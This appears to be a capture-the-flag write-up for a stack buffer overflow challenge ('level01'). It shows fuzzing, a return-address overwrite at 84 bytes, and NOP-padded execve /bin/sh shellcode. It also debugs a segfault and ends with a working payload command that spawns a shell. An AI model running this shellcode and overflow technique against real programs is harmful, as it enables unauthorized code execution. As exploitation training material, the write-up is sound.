=> Fuzzing, filling the buffers

=> The first fgest doesn't overflow and return every time "invalid username"

=> We test with username: "dat_wil" to try the overflow of the second buffer
=> We overwrite the return addr of main with an 80 + 4 bytes
r < <(python -c 'print "dat_wil\n" + "A"*84')
0x41414141 in ?? ()

=> Then we create a payload that overwrite the ret addr of main and redirect it to a shellcode inside the buffer
python -c 'print "dat_wil\n" + "\x90"*(80-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xec\xd5\xff\xff"'

=> It doesn't work, we have a SEGFAULT 
0xffffd72d in ?? ()

0xffffd720:	0x6850c031	0x68732f2f	0x69622f68	0x00000001 <- (0x1 ??)

=> It's because enter the condition, print the error and the ret value is set to 1, ret = 1
=> The ret overwrite our shellcode at the address 0xffffd72d
=> To avoid this we need to write our payload before or after this value

=> Let's test to write the payload before:
r < <(python -c 'print "dat_wil\n" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(80 - 48) + "\xec\xd6\xff\xff"')
=> /bin/dash new process is executed 


(python -c 'print "dat_wil\n" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(80 - 48) + "\xec\xd6\xff\xff"'; cat) | ./level01
